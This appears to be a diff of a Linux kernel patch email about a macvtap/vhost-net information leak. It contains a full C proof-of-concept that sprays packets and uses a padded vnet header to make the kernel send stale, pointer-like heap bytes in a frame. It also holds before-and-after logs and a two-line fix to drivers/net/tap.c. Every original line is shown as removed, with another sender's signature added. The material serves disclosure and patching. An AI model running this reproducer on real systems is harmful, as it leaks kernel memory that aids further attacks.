-a zeroed 260-byte descriptor (246-byte vnet header + 14-byte Ethernet
-frame) over macvtap0 bridged onto veth0->veth1 produced a 128-byte
-received frame with 50 nonzero stale bytes in the 114-byte tail:
-
-  [POC] spray sent=256 drained=222
-  [POC] trigger received_len=128 expected_user_frame=14
-  [POC] trigger tail_bytes=114 tail_nonzero=50
-  [POC] trigger tail_first_64=d0cd3e008188ffffd0cd3e008188ffffe8cd3e008188ffff400000000000000060ce3e008188ffff48ce3e008188ffff50ce3e008188ffff58ce3e008188ffff
-  [POC] control received_len=14 expected_user_frame=14
-  [POC] used_idx=2 trigger=128 control=14
-
-Generic KASAN also delivered a 128-byte trigger frame (with zeroed tail
-bytes); this is an initialized-length mismatch rather than an OOB
-memory access.
-
-With this patch applied, both trigger and control arrive as 14-byte
-frames:
-
-  [POC] trigger received_len=14 expected_user_frame=14
-  [POC] control received_len=14 expected_user_frame=14
-  [POC] used_idx=2 trigger=14 control=14
-
-Disclosure: An in-house LLM-based analysis tool developed by the author
-assisted in surfacing this bug candidate and drafting the initial notes.
-All root-cause analysis, patch code, and QEMU/KVM reproducer results
-were manually reviewed and independently verified by the author.
-
-=== poc.c ===
-// SPDX-License-Identifier: GPL-2.0
-/*
- * Run inside an x86_64 VM with CONFIG_MACVTAP, CONFIG_VHOST_NET and VETH.
- * The init script should create veth0<->veth1 and macvtap0 over veth0,
- * bring them up, and pass the /dev/tapN path as argv[1].  Boot with
- * vhost_net.experimental_zcopytx=1 and init_on_alloc=0.
- *
- * This directly compares a 246-byte vnet header + 14-byte frame with a
- * normal 10-byte header + the same frame.  It captures what veth1 receives.
- */
-#define _GNU_SOURCE
-#include <arpa/inet.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <inttypes.h>
-#include <linux/if_tun.h>
-#include <linux/if_ether.h>
-#include <linux/if_packet.h>
-#include <linux/virtio_ring.h>
-#include <linux/vhost.h>
-#include <net/if.h>
-#include <poll.h>
-#include <stdatomic.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/eventfd.h>
-#include <sys/ioctl.h>
-#include <sys/mman.h>
-#include <sys/socket.h>
-#include <unistd.h>
-
-#define PHYS_BASE 0x100000ULL
-#define MEM_SIZE  0x10000U
-#define VRING_N   8U
-
-static void die(const char *what)
-{
-	perror(what);
-	exit(1);
-}
-
-static void checked_ioctl(int fd, unsigned long request, void *arg,
-			  const char *name)
-{
-	if (ioctl(fd, request, arg))
-		die(name);
-}
-
-static void make_frame(unsigned char *dst, const unsigned char dest[ETH_ALEN])
-{
-	const unsigned char eth[ETH_HLEN] = {
-		0, 0, 0, 0, 0, 0,
-		0x02, 0xaa, 0xbb, 0xcc, 0xdd, 0xee,
-		0x88, 0xb5,
-	};
-	memcpy(dst, eth, sizeof(eth));
-	memcpy(dst, dest, ETH_ALEN);
-}
-
-static int recv_frame(int sock, const char *label)
-{
-	unsigned char buf[2048];
-	struct pollfd pfd = {.fd = sock, .events = POLLIN};
-	ssize_t n;
-	int tries;
-
-	for (tries = 0; tries < 10; tries++) {
-		if (poll(&pfd, 1, 2500) <= 0)
-			return -1;
-		n = recv(sock, buf, sizeof(buf), 0);
-		if (n < ETH_HLEN || buf[12] != 0x88 || buf[13] != 0xb5)
-			continue;
-		printf("[POC] %s received_len=%zd expected_user_frame=14\n", label, n);
-		printf("[POC] %s first_32=", label);
-		for (int i = 0; i < n && i < 32; i++)
-			printf("%02x", buf[i]);
-		printf("\n");
-		if (n > ETH_HLEN) {
-			int nonzero = 0;
-			for (int i = ETH_HLEN; i < n; i++)
-				nonzero += buf[i] != 0;
-			printf("[POC] %s tail_bytes=%zd tail_nonzero=%d\n",
-			       label, n - ETH_HLEN, nonzero);
-			if (nonzero) {
-				printf("[POC] %s tail_first_64=", label);
-				for (int i = ETH_HLEN; i < n && i < ETH_HLEN + 64; i++)
-					printf("%02x", buf[i]);
-				printf("\n");
-			}
-		}
-		return (int)n;
-	}
-	return -1;
-}
-
-static void spray_skb_heads(int tapfd, int recvfd,
-			    const unsigned char dest[ETH_ALEN])
-{
-	unsigned char packet[246 + 128], discard[2048];
-	int sent = 0, drained = 0, flags;
-
-	memset(packet, 0, 246);
-	memset(packet + 246, 0xa5, 128);
-	make_frame(packet + 246, dest);
-	packet[246 + 13] = 0xb6; /* distinct EtherType from the witness */
-	for (int i = 0; i < 256; i++)
-		if (write(tapfd, packet, sizeof(packet)) == sizeof(packet))
-			sent++;
-	usleep(100000);
-	flags = fcntl(recvfd, F_GETFL);
-	if (flags < 0 || fcntl(recvfd, F_SETFL, flags | O_NONBLOCK))
-		die("set packet socket nonblocking");
-	while (recv(recvfd, discard, sizeof(discard), 0) > 0)
-		drained++;
-	printf("[POC] spray sent=%d drained=%d\n", sent, drained);
-}
-
-int main(int argc, char **argv)
-{
-	struct vhost_memory *mem;
-	struct vhost_vring_state state = {.index = 1, .num = VRING_N};
-	struct vhost_vring_addr addr = {.index = 1};
-	struct vhost_vring_file file = {.index = 1};
-	struct vring_desc *desc;
-	struct vring_avail *avail;
-	struct vring_used *used;
-	struct sockaddr_ll sa = {0};
-	struct ifreq ifr = {0};
-	unsigned char *area, *packet;
-	unsigned char dest[ETH_ALEN];
-	uint64_t features = 0, one = 1;
-	int recvfd, tapfd, vhostfd, kickfd, callfd, hdrsz, rc1, rc2;
-
-	if (argc != 2) {
-		fprintf(stderr, "usage: %s /dev/tapN\n", argv[0]);
-		return 2;
-	}
-	setvbuf(stdout, NULL, _IONBF, 0);
-
-	recvfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-	if (recvfd < 0)
-		die("packet socket");
-	sa.sll_family = AF_PACKET;
-	sa.sll_protocol = htons(ETH_P_ALL);
-	sa.sll_ifindex = if_nametoindex("veth1");
-	if (!sa.sll_ifindex)
-		die("if_nametoindex veth1");
-	if (bind(recvfd, (void *)&sa, sizeof(sa)))
-		die("bind packet socket");
-	strcpy(ifr.ifr_name, "veth1");
-	if (ioctl(recvfd, SIOCGIFHWADDR, &ifr))
-		die("SIOCGIFHWADDR veth1");
-	memcpy(dest, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
-
-	tapfd = open(argv[1], O_RDWR | O_NONBLOCK);
-	if (tapfd < 0)
-		die("open macvtap");
-	vhostfd = open("/dev/vhost-net", O_RDWR);
-	if (vhostfd < 0)
-		die("open vhost-net");
-	kickfd = eventfd(0, EFD_CLOEXEC);
-	callfd = eventfd(0, EFD_CLOEXEC | EFD_NONBLOCK);
-	if (kickfd < 0 || callfd < 0)
-		die("eventfd");
-
-	area = mmap(NULL, MEM_SIZE, PROT_READ | PROT_WRITE,
-		    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-	if (area == MAP_FAILED)
-		die("mmap guest memory");
-	desc = (void *)(area + 0x1000);
-	avail = (void *)(area + 0x2000);
-	used = (void *)(area + 0x3000);
-	packet = area + 0x4000;
-
-	mem = calloc(1, sizeof(*mem) + sizeof(mem->regions[0]));
-	if (!mem)
-		die("calloc memory table");
-	mem->nregions = 1;
-	mem->regions[0].guest_phys_addr = PHYS_BASE;
-	mem->regions[0].memory_size = MEM_SIZE;
-	mem->regions[0].userspace_addr = (uintptr_t)area;
-
-	checked_ioctl(vhostfd, VHOST_SET_OWNER, NULL, "VHOST_SET_OWNER");
-	checked_ioctl(vhostfd, VHOST_SET_MEM_TABLE, mem, "VHOST_SET_MEM_TABLE");
-	checked_ioctl(vhostfd, VHOST_SET_FEATURES, &features, "VHOST_SET_FEATURES");
-	checked_ioctl(vhostfd, VHOST_SET_VRING_NUM, &state, "VHOST_SET_VRING_NUM");
-	state.num = 0;
-	checked_ioctl(vhostfd, VHOST_SET_VRING_BASE, &state, "VHOST_SET_VRING_BASE");
-	addr.desc_user_addr = (uintptr_t)desc;
-	addr.avail_user_addr = (uintptr_t)avail;
-	addr.used_user_addr = (uintptr_t)used;
-	checked_ioctl(vhostfd, VHOST_SET_VRING_ADDR, &addr, "VHOST_SET_VRING_ADDR");
-	file.fd = kickfd;
-	checked_ioctl(vhostfd, VHOST_SET_VRING_KICK, &file, "VHOST_SET_VRING_KICK");
-	file.fd = callfd;
-	checked_ioctl(vhostfd, VHOST_SET_VRING_CALL, &file, "VHOST_SET_VRING_CALL");
-	file.fd = tapfd;
-	checked_ioctl(vhostfd, VHOST_NET_SET_BACKEND, &file, "VHOST_NET_SET_BACKEND");
-
-	/* Padded header moves the guest's 14-byte frame past the zcopy gate. */
-	hdrsz = 246;
-	checked_ioctl(tapfd, TUNSETVNETHDRSZ, &hdrsz, "TUNSETVNETHDRSZ 246");
-	spray_skb_heads(tapfd, recvfd, dest);
-	memset(packet, 0, 260);
-	make_frame(packet + hdrsz, dest);
-	desc[0].addr = PHYS_BASE + 0x4000;
-	desc[0].len = 260;
-	desc[0].flags = 0;
-	avail->ring[0] = 0;
-	atomic_thread_fence(memory_order_release);
-	avail->idx = 1;
-	if (write(kickfd, &one, sizeof(one)) != sizeof(one))
-		die("kick trigger");
-	rc1 = recv_frame(recvfd, "trigger");
-
-	/* Same 14-byte frame through vhost's normal copy path. */
-	hdrsz = 10;
-	checked_ioctl(tapfd, TUNSETVNETHDRSZ, &hdrsz, "TUNSETVNETHDRSZ 10");
-	memset(packet + 0x1000, 0, 24);
-	make_frame(packet + 0x1000 + hdrsz, dest);
-	desc[1].addr = PHYS_BASE + 0x5000;
-	desc[1].len = 24;
-	desc[1].flags = 0;
-	avail->ring[1] = 1;
-	atomic_thread_fence(memory_order_release);
-	avail->idx = 2;
-	if (write(kickfd, &one, sizeof(one)) != sizeof(one))
-		die("kick control");
-	rc2 = recv_frame(recvfd, "control");
-
-	printf("[POC] used_idx=%u trigger=%d control=%d\n", used->idx, rc1, rc2);
-	if (getenv("EXPECT_FIXED")) {
-		printf("[POC] expected=fixed\n");
-		return rc1 == 14 && rc2 == 14 ? 0 : 1;
-	}
-	printf("[POC] expected=vulnerable\n");
-	return rc1 >= 128 && rc2 >= 14 && rc2 < rc1 ? 0 : 1;
-}
-
- drivers/net/tap.c | 2 ++
- 1 file changed, 2 insertions(+)
-
-diff --git a/drivers/net/tap.c b/drivers/net/tap.c
-index 2f19fb07bb2d..b1f8776a5ca5 100644
---- a/drivers/net/tap.c
-+++ b/drivers/net/tap.c
-@@ -608,6 +608,8 @@ static ssize_t tap_get_user(struct tap_queue *q, void *msg_control,
- 		struct iov_iter i;
- 
- 		copylen = clamp(hdr_len ?: GOODCOPY_LEN, ETH_HLEN, good_linear);
-+		/* A padded vnet header can leave fewer payload bytes than GOODCOPY_LEN. */
-+		copylen = min_t(unsigned long, copylen, len);
- 		linear = copylen;
- 		i = *from;
- 		iov_iter_advance(&i, copylen);
+Best regards,
 -- 
-2.43.0
+Selvamani Rajagopal <Selvamani.Rajagopal@onsemi.com>
+
+
